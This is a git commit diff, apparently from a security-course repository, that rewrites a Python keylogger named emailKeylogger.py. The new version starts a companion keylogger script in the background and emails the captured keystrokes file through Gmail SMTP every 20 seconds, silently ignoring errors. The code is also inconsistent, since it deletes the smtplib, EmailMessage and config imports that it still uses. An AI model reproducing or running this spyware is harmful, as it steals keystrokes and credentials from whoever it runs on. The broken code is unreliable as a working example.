354db2bb54515a8ccc9db0a61efb35660b719a6f
Richard Dunbar <112132616+RND27@users.noreply.github.com>
2022-11-28 17:10:39 -0500

    Update emailKeylogger.py

--- Week_13 ( Reconnaissance | Scanning)/Email Keylogger/emailKeylogger.py
+++ Week_13 ( Reconnaissance | Scanning)/Email Keylogger/emailKeylogger.py
@@ -1,20 +1,44 @@
 #!/usr/bin/python3
 
-import smtplib
-from email.message import EmailMessage
-import config
+import requests
+import time
+import os
+from pynput.keyboard import Listener
 
-with open('keyboard_Input.txt') as msgcontent:
+startlog = time.time()
+
+os.system("python3 /home/student/Desktop/scripts/keyloggerRemoteTest.py &")
+time.sleep(1)
+
+def send_request():
+
+    with open('keyboard_Input.txt') as msgcontent:
         msg = EmailMessage()
         msg.set_content(msgcontent.read())
 
-msg['Subject'] = f'The contents of {"keyboard_Input.txt"}'
-msg['From'] = '<dunbar.ricky@gmail.com'
-msg['To'] = '<dunbar.ricky>@gmail.com'
+    try:
+        msg['Subject'] = f'The contents of {"keyboard_Input.txt"}'
+        msg['From'] = '<dunbar.ricky@gmail.com'
+        msg['To'] = '<dunbar.ricky>@gmail.com'
+        server = smtplib.SMTP('smtp.gmail.com:587')
+        server.ehlo()
+        server.starttls()
+        server.login(config.EMAIL_ADDRESS, config.PASSWORD)
+        server.send_message(msg)
+        server.quit()
+    except: 
+        pass
 
-server = smtplib.SMTP('smtp.gmail.com:587')
-server.ehlo()
-server.starttls()
-server.login(config.EMAIL_ADDRESS, config.PASSWORD)
-server.send_message(msg)
-server.quit()
+def interval():
+    global startlog
+    if time.time() - 20 > startlog:
+        print('Its been 20 secs')
+        send_request()
+        startlog = time.time()
+
+counter = 0
+while True:
+    counter += 1
+    print(counter)
+    interval()
+    time.sleep(1)
